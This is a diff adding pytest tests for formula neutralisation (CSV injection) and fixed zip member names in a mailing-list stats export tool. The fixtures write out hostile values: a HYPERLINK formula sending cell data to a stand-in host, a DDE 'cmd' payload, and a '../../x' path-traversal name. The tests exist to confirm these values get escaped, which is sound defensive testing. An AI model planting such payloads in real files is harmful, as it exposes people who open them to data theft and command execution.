@@ -29,13 +29,14 @@ from __future__ import annotations
 import csv
 import io
 import json
+import re
 import zipfile
 from datetime import datetime
 from pathlib import Path
 
 import pytest
 
-from mailing_list_ai_check import __version__, codec, export_import
+from mailing_list_ai_check import __version__, codec, export_import, stats_export
 from mailing_list_ai_check.cli import stats_export_main
 from email_reply_extractor.extraction import EXTRACTION_VERSION
 from mailing_list_ai_check.stats_export import (
@@ -874,6 +875,138 @@ def test_all_lists_skips_a_list_with_nothing_in_range(source, tmp_path):
     path = _export(source, tmp_path, date_to="2026-01-31")
     assert _mlac(path)["folders"] == [ANNOUNCE]
     assert [row["folder"] for row in _rows(path, LISTS_MEMBER)] == [ANNOUNCE]
+
+
+# ==============================================================================
+# Formula neutralisation (CSV injection)
+# ==============================================================================
+
+#: The reversal rule the archive README states, applied by a consumer.
+_ESCAPED = re.compile(r"^'+[=+\-@\t\r]")
+
+
+def _unescape(value: str) -> str:
+    return value[1:] if _ESCAPED.match(value) else value
+
+
+HOSTILE_NAME = '=HYPERLINK("http://x.example/?"&A1,"x")'
+HOSTILE_CMD = "=cmd|'/c calc'!A1"
+
+
+def _make_hostile(store: Store) -> None:
+    """Rewrite fixture values into the shapes a third party can make them take."""
+    conn = store.conn
+    conn.execute("UPDATE messages SET from_name = ? WHERE message_id = ?", (HOSTILE_NAME, M1))
+    conn.execute("UPDATE messages SET from_name = ? WHERE message_id = ?", (HOSTILE_CMD, M2))
+    conn.execute("UPDATE messages SET from_name = ? WHERE message_id = ?", ("'=quoted", M4))
+    conn.execute("UPDATE messages SET in_reply_to = ? WHERE message_id = ?", ("@SUM(1)", M6))
+    conn.execute("UPDATE messages SET timing_cpm = ? WHERE message_id = ?", (-5.5, M1))
+    conn.execute(
+        "UPDATE addresses SET email = ? WHERE email = ?", ("-bob@example.org", "bob@example.org")
+    )
+    conn.execute(
+        "UPDATE addresses SET email = ? WHERE email = ?",
+        ("+carol@example.org", "carol@example.org"),
+    )
+    conn.execute(
+        "UPDATE lists SET name = ?, folder = ? WHERE folder = ?", ("\tann", "+ann", ANNOUNCE)
+    )
+    conn.commit()
+
+
+def test_cell_escapes_formula_triggers_and_leaves_other_values_alone():
+    cell = stats_export._cell
+    for value in ("=1+1", "+1", "-1", "@A1", "\tx", "\rx", "'=x", "''-x"):
+        assert cell(value) == "'" + value
+    for value in ("Alice", "'Quoted Name'", "'", "", "a=b", "x-y", "<m1@example.org>"):
+        assert cell(value) == value
+    # Numbers, negatives included, and booleans are not text and are not escaped.
+    assert cell(-1) == -1
+    assert cell(-0.5) == -0.5
+    assert cell(True) == "true"
+    assert cell(None) == ""
+
+
+def test_hostile_text_is_escaped_in_every_member(source, tmp_path):
+    _make_hostile(source)
+    path = _export(source, tmp_path)
+    rows = _by_message_id(_rows(path, MESSAGES_MEMBER))
+    assert rows[M1]["sender_name"] == "'" + HOSTILE_NAME
+    assert rows[M2]["sender_name"] == "'" + HOSTILE_CMD
+    assert rows[M4]["sender_name"] == "''=quoted"
+    assert rows[M6]["in_reply_to"] == "'@SUM(1)"
+    assert rows[M2]["email"] == "'-bob@example.org"
+    assert rows[M4]["email"] == "'+carol@example.org"
+    assert (rows[M1]["list"], rows[M1]["folder"]) == ("'\tann", "'+ann")
+    # A negative number is written as a number.
+    assert rows[M1]["timing_cpm"] == "-5.5"
+    lists = {row["folder"]: row for row in _rows(path, LISTS_MEMBER)}
+    assert lists["'+ann"]["list"] == "'\tann"
+    senders = {row["email"] for row in _rows(path, SENDERS_MEMBER)}
+    assert {"'-bob@example.org", "'+carol@example.org"} <= senders
+    # No field of any member begins with an unescaped trigger character.
+    for member in (MESSAGES_MEMBER, LISTS_MEMBER, SENDERS_MEMBER):
+        text = io.StringIO(_member_bytes(path, member).decode("utf-8"), newline="")
+        for record in csv.reader(text):
+            for field in record:
+                assert not re.match(r"[=+@\t\r]", field)
+                assert not re.match(r"-[^0-9]", field)
+
+
+def test_escaping_keeps_the_joins_and_keys_intact(source, tmp_path):
+    _make_hostile(source)
+    path = _export(source, tmp_path)
+    messages = _rows(path, MESSAGES_MEMBER)
+    folders = {row["folder"] for row in _rows(path, LISTS_MEMBER)}
+    emails = {row["email"] for row in _rows(path, SENDERS_MEMBER)}
+    assert {row["folder"] for row in messages} <= folders
+    assert {row["email"] for row in messages if row["email"]} <= emails
+
+
+def test_readme_rule_recovers_the_stored_values(source, tmp_path):
+    _make_hostile(source)
+    path = _export(source, tmp_path)
+    readme = _member_bytes(path, README_MEMBER).decode("utf-8")
+    assert "`^'+[=+\\-@\\t\\r]`" in readme
+    rows = _by_message_id(_rows(path, MESSAGES_MEMBER))
+    stored = {
+        row["message_id"]: row
+        for row in source.conn.execute(
+            "SELECT m.message_id, m.from_name, m.in_reply_to, a.email FROM messages m "
+            "LEFT JOIN addresses a ON a.id = m.address_id"
+        )
+    }
+    for message_id, row in rows.items():
+        want = stored[message_id]
+        if want["from_name"]:
+            assert _unescape(row["sender_name"]) == want["from_name"]
+        assert _unescape(row["in_reply_to"]) == (want["in_reply_to"] or "")
+        assert _unescape(row["email"]) == (want["email"] or "")
+        assert _unescape(row["folder"]) in {"+ann", LAST_CALL}
+    # The descriptor carries the stored folder values unaltered.
+    assert "+ann" in _mlac(path)["folders"]
+
+
+def test_ordinary_values_are_byte_identical_to_an_unescaped_export(source, tmp_path, monkeypatch):
+    """The fixture holds no trigger values, so escaping changes no byte of any CSV."""
+    escaped = _export(source, tmp_path, name="escaped")
+    monkeypatch.setattr(stats_export, "_neutralise_formula", lambda value: value)
+    plain = _export(source, tmp_path, name="plain")
+    for member in (MESSAGES_MEMBER, LISTS_MEMBER, SENDERS_MEMBER):
+        assert _member_bytes(escaped, member) == _member_bytes(plain, member)
+
+
+def test_member_names_are_fixed_whatever_the_stored_strings(source, tmp_path):
+    """No member name is derived from a list name or other stored value."""
+    source.conn.execute(
+        "UPDATE lists SET name = ?, folder = ? WHERE folder = ?", ("../../x", "../../x", ANNOUNCE)
+    )
+    source.conn.commit()
+    path = _export(source, tmp_path)
+    with zipfile.ZipFile(path) as archive:
+        assert sorted(archive.namelist()) == sorted(
+            [MESSAGES_MEMBER, LISTS_MEMBER, SENDERS_MEMBER, DATAPACKAGE_MEMBER, README_MEMBER]
+        )
 
 
 # ==============================================================================
